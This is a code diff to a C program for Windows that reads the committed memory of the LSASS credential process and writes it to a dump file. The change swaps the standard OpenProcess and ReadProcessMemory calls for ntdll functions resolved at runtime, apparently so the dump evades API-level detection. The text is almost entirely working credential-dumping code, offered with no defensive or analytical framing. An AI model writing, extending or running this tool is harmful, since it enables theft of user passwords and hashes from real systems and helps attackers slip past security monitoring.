@@ -8,11 +8,59 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <windows.h>
-#include <tlhelp32.h>
+#include <Windows.h>
+#include <TlHelp32.h>
 
+#pragma comment(lib, "ntdll.lib") // Link with ntdll.lib
+
+typedef LONG NTSTATUS;
+typedef struct _CLIENT_ID {
+    HANDLE UniqueProcess;
+    HANDLE UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+#define InitializeObjectAttributes(p, n, a, r, s) \
+    {                                            \
+        (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
+        (p)->RootDirectory = r;                  \
+        (p)->Attributes = a;                     \
+        (p)->ObjectName = n;                     \
+        (p)->SecurityDescriptor = s;             \
+        (p)->SecurityQualityOfService = NULL;    \
+    }
+
+typedef NTSTATUS(NTAPI* pNtOpenProcess)(
+    PHANDLE ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    PCLIENT_ID ClientId
+);
+
+typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
+    HANDLE ProcessHandle,
+    LPCVOID BaseAddress,
+    LPVOID Buffer,
+    SIZE_T BufferSize,
+    SIZE_T* NumberOfBytesRead
+);
+
+#define READ_SIZE 4096
 #define DUMP_FILE "lsass_dump.bin"
-#define READ_SIZE 4096  // Read in 4KB chunks
 
 // Function to get LSASS process ID
 DWORD GetLsassPID() {
@@ -22,7 +70,7 @@ DWORD GetLsassPID() {
 
     snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
-        printf("[!] Failed to create process snapshot. Error: %d\n", GetLastError());
+        printf("[!] Failed to create process snapshot. Error: %lu\n", GetLastError());
         return 0;
     }
 
@@ -40,21 +88,43 @@ DWORD GetLsassPID() {
     return lsassPID;
 }
 
-// Function to dump LSASS memory using ReadProcessMemory()
+// Function to dump LSASS memory using direct NT syscalls
 void DumpLsassMemory() {
     DWORD lsassPID = GetLsassPID();
     if (lsassPID == 0) {
         printf("[!] Could not find LSASS process.\n");
         return;
     }
-    printf("[+] LSASS PID: %d\n", lsassPID);
+    printf("[+] LSASS PID: %lu\n", lsassPID);
 
-    HANDLE lsassProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPID);
-    if (!lsassProcess) {
-        printf("[!] Failed to open LSASS process. Error: %d\n", GetLastError());
+    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
+    if (!hNtdll) {
+        printf("[!] Failed to load ntdll.dll\n");
         return;
     }
-    printf("[+] Opened LSASS process successfully.\n");
+
+    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
+    pNtReadVirtualMemory NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
+
+    if (!NtOpenProcess || !NtReadVirtualMemory) {
+        printf("[!] Failed to resolve NtOpenProcess or NtReadVirtualMemory\n");
+        return;
+    }
+
+    HANDLE lsassProcess = NULL;
+    CLIENT_ID clientId;
+    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)lsassPID;
+    clientId.UniqueThread = 0;
+
+    OBJECT_ATTRIBUTES objAttr;
+    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
+
+    NTSTATUS status = NtOpenProcess(&lsassProcess, PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &objAttr, &clientId);
+    if (status != 0) {
+        printf("[!] NtOpenProcess failed! Status: 0x%X\n", status);
+        return;
+    }
+    printf("[+] Opened LSASS process successfully using NtOpenProcess.\n");
 
     FILE *dumpFile = fopen(DUMP_FILE, "wb");
     if (!dumpFile) {
@@ -71,7 +141,8 @@ void DumpLsassMemory() {
 
     while (VirtualQueryEx(lsassProcess, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
         if (mbi.State == MEM_COMMIT && (mbi.Protect & PAGE_READWRITE)) {
-            if (ReadProcessMemory(lsassProcess, mbi.BaseAddress, buffer, READ_SIZE, &bytesRead)) {
+            status = NtReadVirtualMemory(lsassProcess, mbi.BaseAddress, buffer, READ_SIZE, &bytesRead);
+            if (status == 0) {
                 fwrite(buffer, 1, bytesRead, dumpFile);
             }
         }
